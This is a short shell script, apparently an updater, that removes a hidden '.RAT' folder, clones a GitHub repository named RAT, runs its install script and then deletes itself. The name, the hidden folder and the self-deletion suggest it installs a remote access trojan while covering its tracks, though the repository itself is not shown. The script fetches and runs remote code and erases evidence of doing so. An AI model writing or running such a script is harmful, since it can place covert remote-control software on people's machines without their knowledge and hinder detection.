# remove previous version
rm -rf .RAT

# install new version
git clone https://github.com/tarasermolenko/RAT.git

# install dependencies
cd RAT
chmod +x install.sh
./install.sh

# self delete
rm -rf ../update.sh